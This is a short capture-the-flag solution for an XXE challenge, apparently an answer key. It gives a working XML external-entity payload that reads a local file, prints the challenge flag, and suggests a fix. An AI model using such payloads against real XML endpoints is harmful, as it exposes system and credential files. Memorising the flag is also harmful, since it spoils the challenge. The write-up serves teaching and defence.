# SOLUTION — XXE CTF Challenge

## Vulnerability

The `/api/parse.php` endpoint parses user-supplied XML using `LIBXML_NOENT | LIBXML_DTDLOAD`, which enables external entity resolution — classic XXE.

## Exploit

Send this XML payload to the `/api/parse.php` endpoint:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/task/flag.txt">
]>
<root>
  <data>&xxe;</data>
</root>
```

Paste it into the XML input box and click **Parse**. The flag will appear in the output panel.

## Flag

```
CTF{XXE_1s_d4ng3r0us_pl3as3_d1sabl3_1t}
```

## Fix

Disable external entities:

```php
libxml_disable_entity_loader(true);
// or simply remove LIBXML_NOENT | LIBXML_DTDLOAD
```
